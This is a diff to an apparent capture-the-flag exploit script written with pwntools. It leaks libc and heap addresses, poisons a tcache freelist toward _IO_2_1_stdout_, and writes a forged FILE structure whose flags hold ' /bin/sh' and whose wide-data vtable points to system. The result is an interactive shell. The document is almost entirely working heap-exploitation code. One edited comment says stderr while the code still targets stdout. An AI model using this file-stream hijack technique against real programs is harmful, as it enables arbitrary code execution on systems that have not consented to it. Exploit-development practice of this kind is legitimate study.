@@ -70,14 +70,14 @@ h = Handler(io)
 fs = FileStructure()
 
 h.new(0x411) # 0
-h.new(0x100) # 1 | malloc consolidate
+h.new(0x200) # 1 | malloc consolidate
 
 h.delete(0)
 h.new(0x411) # fill 0 chunk again -> 2
 libc.address = u64(h.read(0)) - main_arena
 io.warn(f"libc leak: {libc.address:x}")
 
-h.new(0x100) # 3
+h.new(0x200) # 3
 
 h.delete(1) # 1
 h.delete(3) # 3
@@ -86,15 +86,14 @@ io.warn(f"heap leak: {heap_leak:x}")
 
 h.write(3, p64(encode_ptr(heap_leak, libc.symbols['_IO_2_1_stdout_'])))
 
-h.new(0x100) # 4 | skip
-h.new(0x100) # 5 | _IO_2_1_stdout_ 
+h.new(0x200) # 4 | skip
+h.new(0x200) # 5 | _IO_2_1_stderr_ 
 
-h.write(1, p64(heap_leak + 0x8 - 0x68) + p64(libc.symbols["system"])) #heap_addr - (offset used by _IO_wdoallcbuf_) + 0x8, heap_addr + 0x8 = system
-  
-fs.flags = b" /bin/sh"          #This set $RDI = " /bin/sh" (space is importat to validate the flags)
-fs.vtable = libc.sym["_IO_wfile_jumps"] + 0x18 - 0x38  #_IO_wfile_overflow ptr
-fs._wide_data = heap_leak - 0xe0  #heap_addr - (offset to _wide_data vtable)
-
+h.write(1, p64(heap_leak + 0x8 - 0x68) + p64(libc.symbols["system"]))
+    
+fs.flags = b" /bin/sh"
+fs.vtable = libc.symbols["_IO_wfile_jumps"] + 0x40 - 0x30
+fs._wide_data = heap_leak - 0xe0 
 h.write(5, bytes(fs))
 
 io.interactive()
